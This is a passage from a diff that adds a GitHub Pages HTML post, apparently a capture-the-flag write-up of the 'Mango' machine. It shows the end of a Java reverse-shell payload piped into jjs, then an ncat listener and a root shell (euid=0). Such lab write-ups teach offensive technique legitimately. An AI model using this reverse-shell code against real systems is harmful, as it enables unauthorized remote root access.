+var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()&gt;0)so.write(pi.read()); while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'</span> | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+</code></pre></div></div>
+
+<p>we start our <code class="language-plaintext highlighter-rouge">ncat</code> listener and <strong>set the required environment variables</strong> over on the victim machine before <strong>executing the shell.</strong></p>
+
+<p><img src="/assets/Mango/rooted.jpg" alt="" /></p>
+
+<p><em>from the effective UID</em> <code class="language-plaintext highlighter-rouge">euid=0(root)</code>, we’re now acting as <code class="language-plaintext highlighter-rouge">root</code> :)</p>
+
+  </div><a class="u-url" href="/2022/10/11/Mango.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
